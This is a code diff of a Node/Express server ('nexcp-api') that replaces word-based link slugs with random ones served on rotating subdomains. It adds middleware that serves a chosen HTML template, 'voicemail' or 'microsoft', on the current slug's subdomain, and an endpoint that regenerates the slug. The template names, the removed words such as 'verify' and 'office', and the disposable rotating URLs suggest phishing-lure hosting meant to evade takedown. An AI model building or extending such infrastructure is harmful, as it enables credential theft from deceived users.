@@ -30,16 +30,12 @@ app.use('/api/', lim);
 app.get('/', (_req, res) => res.json({ status: 'ok', service: 'nexcp-api' }));
 
 // ── Random link slug generator ────────────────────────────────────────────────
-const SLUG_WORDS = [
-  'cloud','azure','secure','verify','portal','office','teams','share','access',
-  'connect','data','sync','flow','vault','guard','link','pulse','vision','edge',
-  'core','prime','apex','nova','wave','spark','swift','bright','clear','trust',
-  'smart','digital','global','intel','logic','nexus','orbit','proxy','relay','route'
-];
+const LINK_BASE_DOMAIN = process.env.LINK_BASE_DOMAIN || '';
+const SLUG_CHARS = 'abcdefghijklmnopqrstuvwxyz0123456789';
 function generateSlug() {
-  const pick = () => SLUG_WORDS[Math.floor(Math.random() * SLUG_WORDS.length)];
-  const num = Math.floor(Math.random() * 900) + 100;
-  return `${pick()}-${pick()}-${num}`;
+  let s = '';
+  for (let i = 0; i < 10; i++) s += SLUG_CHARS[Math.floor(Math.random() * SLUG_CHARS.length)];
+  return s;
 }
 
 function ensureLinkSlug() {
@@ -1327,28 +1323,38 @@ app.put('/api/settings', auth, (req, res) => {
 app.get('/api/link/info', auth, (req, res) => {
   const slug = db.prepare("SELECT value FROM settings WHERE key = 'link_slug'").get()?.value || '';
   const updatedAt = db.prepare("SELECT value FROM settings WHERE key = 'link_slug_updated_at'").get()?.value || '';
-  const proto = req.headers['x-forwarded-proto'] || req.protocol;
-  const host = req.headers['x-forwarded-host'] || req.headers.host;
-  const url = slug ? `${proto}://${host}/${slug}` : '';
-  res.json({ slug, url, updated_at: updatedAt });
+  const proto = req.headers['x-forwarded-proto'] || 'https';
+  const baseDomain = LINK_BASE_DOMAIN;
+  const url = (slug && baseDomain) ? `${proto}://${slug}.${baseDomain}` : '';
+  res.json({ slug, url, updated_at: updatedAt, base_domain: baseDomain });
 });
 
 app.post('/api/link/regenerate', auth, (req, res) => {
   const slug = rotateLinkSlug();
-  const proto = req.headers['x-forwarded-proto'] || req.protocol;
-  const host = req.headers['x-forwarded-host'] || req.headers.host;
-  const url = `${proto}://${host}/${slug}`;
-  res.json({ slug, url, updated_at: new Date().toISOString() });
+  const proto = req.headers['x-forwarded-proto'] || 'https';
+  const baseDomain = LINK_BASE_DOMAIN;
+  const url = baseDomain ? `${proto}://${slug}.${baseDomain}` : '';
+  res.json({ slug, url, updated_at: new Date().toISOString(), base_domain: baseDomain });
 });
 
 // ══ STATIC ═══════════════════════════════════════════════════════════════════
 
-// Serve frontend-link — dynamic slug route (replaces old /link)
+// Serve frontend-link — subdomain-based (slug.basedomain)
 const linkDir = path.join(__dirname, '../frontend-link');
-app.use('/link', express.static(linkDir)); // keep /link for static assets (css/js)
-app.get('/:slug', (req, res, next) => {
+app.use('/link-assets', express.static(linkDir));
+
+// Middleware: if hostname matches slug.LINK_BASE_DOMAIN, serve link page
+app.use((req, res, next) => {
+  if (!LINK_BASE_DOMAIN) return next();
+  const host = (req.hostname || '').toLowerCase();
+  if (!host.endsWith('.' + LINK_BASE_DOMAIN)) return next();
+  const sub = host.slice(0, -(LINK_BASE_DOMAIN.length + 1));
+  if (!sub || sub.includes('.')) return next();
   const currentSlug = db.prepare("SELECT value FROM settings WHERE key = 'link_slug'").get()?.value;
-  if (!currentSlug || req.params.slug !== currentSlug) return next();
+  if (!currentSlug || sub !== currentSlug) return res.status(404).send('Not found');
+  // Serve API routes normally even on link subdomain
+  if (req.path.startsWith('/api/')) return next();
+  // Serve linked HTML
   const row = db.prepare("SELECT value FROM settings WHERE key = 'link_template'").get();
   const template = row?.value || 'voicemail';
   const fileMap = { voicemail: 'index.html', microsoft: 'microsoft.html' };
